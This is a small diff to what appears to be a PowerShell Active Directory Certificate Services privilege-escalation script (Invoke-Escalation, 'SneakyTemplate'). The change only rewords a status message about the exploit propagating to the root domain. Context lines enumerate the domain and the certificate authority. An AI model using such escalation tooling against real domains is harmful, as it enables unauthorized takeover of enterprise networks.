@@ -383,7 +383,7 @@ Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate
     $Tld =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-1]
     $RootDomain =  Get-ADForest | select -ExpandProperty RootDomain
     $ChildDomain = Get-ADDomain | select -ExpandProperty NetBIOSName
-    echo "[+] We are in running the exploit on user $ChildDomain\$Username which will propagate up to the $RootDomain.$Tld root domain !"
+    echo "[+] We are in running the exploit on user $ChildDomain\$Username which will propagate up to the $RootDomain root domain !"
     # Get the current CA name
     $CAName = (Get-ADObject -Filter 'ObjectClass -eq "pKIEnrollmentService"' -SearchBase (Get-ADRootDSE).ConfigurationNamingContext).Name
     
